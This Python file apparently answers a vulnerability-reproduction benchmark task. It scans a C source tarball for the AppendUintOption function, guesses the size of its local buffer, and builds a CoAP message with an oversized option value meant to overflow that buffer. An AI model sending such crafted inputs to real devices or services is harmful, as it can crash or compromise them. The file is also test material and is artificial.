import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return True
    head = data[:2048]
    if b"\x00" in head:
        return False
    non_print = 0
    for b in head:
        if b in (9, 10, 13):
            continue
        if b < 32 or b > 126:
            non_print += 1
    return non_print / max(1, len(head)) < 0.30


_define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$")
_enum_assign_re = re.compile(r"^\s*([A-Za-z_]\w*)\s*=\s*([^,/{]+)")


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*", "", s)
    return s


def _strip_c_casts(expr: str) -> str:
    # Remove common C/C++ casts: (type)expr, static_cast<type>(expr), reinterpret_cast<type>(expr)
    expr = expr.strip()
    while True:
        new = re.sub(r"^\(\s*[\w:\s\*\&\<\>\,]+\s*\)\s*", "", expr)
        if new == expr:
            break
        expr = new.strip()
    expr = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", expr)
    expr = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", expr)
    expr = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", expr)
    expr = re.sub(r"\bdynamic_cast\s*<[^>]+>\s*\(", "(", expr)
    return expr.strip()


_int_lit_re = re.compile(r"^\s*([+-]?)\s*(0x[0-9A-Fa-f]+|\d+)\s*([uUlL]*)\s*$")


def _parse_int_literal(s: str) -> Optional[int]:
    m = _int_lit_re.match(s)
    if not m:
        return None
    sign, num, _suffix = m.groups()
    base = 16 if num.lower().startswith("0x") else 10
    val = int(num, base)
    if sign == "-":
        val = -val
    return val


_allowed_expr_re = re.compile(r"^[0-9A-Fa-fxX\s\(\)\+\-\*/%<>&\^|\~]+$")


def _safe_eval_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    if not _allowed_expr_re.match(expr):
        return None
    try:
        v = eval(expr, {"__builtins__": None}, {})
    except Exception:
        return None
    if isinstance(v, bool):
        return int(v)
    if not isinstance(v, int):
        return None
    return v


def _resolve_int(expr: str, macros: Dict[str, int]) -> Optional[int]:
    expr = _strip_c_comments(expr).strip()
    expr = _strip_c_casts(expr)
    if not expr:
        return None

    # Remove outer parens repeatedly if balanced
    while expr.startswith("(") and expr.endswith(")"):
        inner = expr[1:-1].strip()
        if inner.count("(") == inner.count(")"):
            expr = inner
        else:
            break

    v = _parse_int_literal(expr)
    if v is not None:
        return v

    if re.fullmatch(r"[A-Za-z_]\w*", expr):
        return macros.get(expr)

    # Replace macros in expressions (simple identifiers only)
    def repl(m: re.Match) -> str:
        name = m.group(0)
        if name in macros:
            return str(macros[name])
        return name

    expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)
    if expr2 != expr and _allowed_expr_re.match(expr2):
        return _safe_eval_expr(expr2)

    return None


def _iter_tar_text_files(src_path: str):
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            name = m.name
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            if not _is_probably_text(data):
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            yield name, text


def _parse_macros(files: List[Tuple[str, str]]) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    # Pass 1: simple defines and enum assigns with numeric literals
    for _name, text in files:
        for line in text.splitlines():
            m = _define_re.match(line)
            if m:
                k, v = m.group(1), m.group(2)
                vv = _parse_int_literal(_strip_c_comments(v).strip())
                if vv is not None:
                    macros[k] = vv
                continue
            m2 = _enum_assign_re.match(line)
            if m2:
                k, v = m2.group(1), m2.group(2)
                vv = _parse_int_literal(_strip_c_comments(v).strip())
                if vv is not None:
                    macros[k] = vv

    # Pass 2: try resolve some simple expressions based on already known macros
    for _ in range(2):
        changed = False
        for _name, text in files:
            for line in text.splitlines():
                m = _define_re.match(line)
                if m:
                    k, v = m.group(1), m.group(2)
                    if k in macros:
                        continue
                    vv = _resolve_int(v, macros)
                    if vv is not None:
                        macros[k] = vv
                        changed = True
                    continue
                m2 = _enum_assign_re.match(line)
                if m2:
                    k, v = m2.group(1), m2.group(2)
                    if k in macros:
                        continue
                    vv = _resolve_int(v, macros)
                    if vv is not None:
                        macros[k] = vv
                        changed = True
        if not changed:
            break

    return macros


def _extract_c_function(text: str, fname: str) -> Optional[Tuple[str, str]]:
    # Find a definition (not a prototype): name(...) {
    # Allow qualifiers and namespaces like foo::AppendUintOption
    pat = re.compile(r"(^|[^\w:])(" + re.escape(fname) + r")\s*\(([^;{}]*)\)\s*\{", re.M)
    m = pat.search(text)
    if not m:
        return None
    start_brace = m.end() - 1
    sig = text[m.start(2):start_brace].strip()

    i = start_brace
    n = len(text)
    depth = 0
    in_str = False
    in_chr = False
    esc = False
    in_line_comment = False
    in_block_comment = False

    while i < n:
        c = text[i]
        nxt = text[i + 1] if i + 1 < n else ""

        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if c == "*" and nxt == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue

        if not in_str and not in_chr:
            if c == "/" and nxt == "/":
                in_line_comment = True
                i += 2
                continue
            if c == "/" and nxt == "*":
                in_block_comment = True
                i += 2
                continue

        if in_str:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == "'":
                    in_chr = False
            i += 1
            continue

        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                body = text[start_brace:i + 1]
                return sig, body
        i += 1

    return None


def _guess_vuln_buf_size(body: str) -> Optional[int]:
    # Try to identify a small local byte buffer used in AppendUintOption
    decl_re = re.compile(r"\b(?:uint8_t|unsigned\s+char|char|std::uint8_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*;")
    sizes: List[int] = []
    for m in decl_re.finditer(body):
        sz = int(m.group(2))
        if 1 <= sz <= 32:
            sizes.append(sz)
    if not sizes:
        return None
    # Vulnerable buffers for varint encoding are typically <= 8
    small = [s for s in sizes if 2 <= s <= 8]
    if not small:
        small = [s for s in sizes if 2 <= s <= 16]
    if not small:
        return None
    # Choose the largest "small" size (often the intended max)
    return max(small)


def _parse_calls_option_numbers(files: List[Tuple[str, str]], macros: Dict[str, int]) -> List[int]:
    nums: List[int] = []

    def parse_args(s: str) -> List[str]:
        args: List[str] = []
        cur = []
        depth = 0
        in_str = False
        in_chr = False
        esc = False
        i = 0
        while i < len(s):
            c = s[i]
            if in_str:
                cur.append(c)
                if esc:
                    esc = False
                else:
                    if c == "\\":
                        esc = True
                    elif c == '"':
                        in_str = False
                i += 1
                continue
            if in_chr:
                cur.append(c)
                if esc:
                    esc = False
                else:
                    if c == "\\":
                        esc = True
                    elif c == "'":
                        in_chr = False
                i += 1
                continue
            if c == '"':
                in_str = True
                cur.append(c)
                i += 1
                continue
            if c == "'":
                in_chr = True
                cur.append(c)
                i += 1
                continue
            if c == "(":
                depth += 1
                cur.append(c)
            elif c == ")":
                if depth > 0:
                    depth -= 1
                cur.append(c)
            elif c == "," and depth == 0:
                arg = "".join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
            else:
                cur.append(c)
            i += 1
        arg = "".join(cur).strip()
        if arg:
            args.append(arg)
        return args

    for _name, text in files:
        idx = 0
        while True:
            p = text.find("AppendUintOption", idx)
            if p < 0:
                break
            # Ensure it's a call-like site
            q = p + len("AppendUintOption")
            while q < len(text) and text[q].isspace():
                q += 1
            if q >= len(text) or text[q] != "(":
                idx = p + 1
                continue

            # Find matching ')'
            i = q + 1
            depth = 1
            in_str = False
            in_chr = False
            esc = False
            in_line_comment = False
            in_block_comment = False
            while i < len(text) and depth > 0:
                c = text[i]
                nxt = text[i + 1] if i + 1 < len(text) else ""

                if in_line_comment:
                    if c == "\n":
                        in_line_comment = False
                    i += 1
                    continue
                if in_block_comment:
                    if c == "*" and nxt == "/":
                        in_block_comment = False
                        i += 2
                    else:
                        i += 1
                    continue

                if not in_str and not in_chr:
                    if c == "/" and nxt == "/":
                        in_line_comment = True
                        i += 2
                        continue
                    if c == "/" and nxt == "*":
                        in_block_comment = True
                        i += 2
                        continue

                if in_str:
                    if esc:
                        esc = False
                    else:
                        if c == "\\":
                            esc = True
                        elif c == '"':
                            in_str = False
                    i += 1
                    continue
                if in_chr:
                    if esc:
                        esc = False
                    else:
                        if c == "\\":
                            esc = True
                        elif c == "'":
                            in_chr = False
                    i += 1
                    continue

                if c == '"':
                    in_str = True
                    i += 1
                    continue
                if c == "'":
                    in_chr = True
                    i += 1
                    continue

                if c == "(":
                    depth += 1
                elif c == ")":
                    depth -= 1
                i += 1

            if depth != 0:
                idx = p + 1
                continue

            args_str = text[q + 1:i - 1]
            # Skip function definitions: if the next non-space is '{'
            j = i
            while j < len(text) and text[j].isspace():
                j += 1
            if j < len(text) and text[j] == "{":
                idx = p + 1
                continue

            args = parse_args(args_str)
            for a in args:
                # Heuristic: likely option number argument is a small constant or macro
                ra = _resolve_int(a, macros)
                if ra is not None and 1 <= ra <= 2048:
                    nums.append(ra)
            idx = p + 1

    # Unique, sorted
    nums = sorted(set(nums))
    return nums


def _coap_encode_extended(value: int) -> Tuple[int, bytes]:
    if value <= 12:
        return value, b""
    if value <= 268:
        return 13, bytes([value - 13])
    # value <= 65804 for 14 with 2 bytes, but allow larger anyway
    ext = value - 269
    return 14, bytes([(ext >> 8) & 0xFF, ext & 0xFF])


def _coap_build_option(delta: int, length: int, value: bytes) -> bytes:
    d_n, d_ext = _coap_encode_extended(delta)
    l_n, l_ext = _coap_encode_extended(length)
    return bytes([(d_n << 4) | l_n]) + d_ext + l_ext + value


def _coap_build_message(options: List[Tuple[int, bytes]]) -> bytes:
    # CoAP header: ver=1, type=CON(0), tkl=0 => 0x40; code=GET(0.01); mid=0
    out = bytearray(b"\x40\x01\x00\x00")
    options_sorted = sorted(options, key=lambda x: x[0])
    prev = 0
    for num, val in options_sorted:
        if num < prev:
            continue
        delta = num - prev
        out += _coap_build_option(delta, len(val), val)
        prev = num
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        files: List[Tuple[str, str]] = []
        for name, text in _iter_tar_text_files(src_path):
            files.append((name, text))

        macros = _parse_macros(files)

        sig_body = None
        for _name, text in files:
            res = _extract_c_function(text, "AppendUintOption")
            if res:
                sig_body = res
                break

        buf_guess = None
        max_value_bytes = 8

        if sig_body:
            sig, body = sig_body
            buf_guess = _guess_vuln_buf_size(body)

            sig_l = sig.lower()
            if "uint16" in sig_l or "std::uint16" in sig_l:
                max_value_bytes = 2
            if "uint32" in sig_l or "std::uint32" in sig_l:
                max_value_bytes = 4
            if "uint64" in sig_l or "std::uint64" in sig_l:
                max_value_bytes = 8
            if "size_t" in sig_l or "uintptr_t" in sig_l:
                max_value_bytes = 8
            if "unsigned long long" in sig_l:
                max_value_bytes = 8

        call_nums = _parse_calls_option_numbers(files, macros)

        preferred = [60, 28, 14, 12, 17, 7, 6, 23, 27]
        optnum = None
        for p in preferred:
            if p in call_nums:
                optnum = p
                break
        if optnum is None:
            optnum = call_nums[0] if call_nums else (macros.get("COAP_OPTION_SIZE1") or macros.get("COAP_OPTION_SIZE2") or 60)

        # Guess minimal overflowing length: likely buf_guess+1, but cap to max_value_bytes
        if buf_guess is None:
            buf_guess = 4
        target_len = min(max_value_bytes, buf_guess + 1)
        if target_len < 2:
            target_len = min(max_value_bytes, 2)

        # Build big-endian value that requires exactly target_len bytes
        val = b"\x01" + (b"\x00" * (target_len - 1))
        return _coap_build_message([(int(optnum), val)])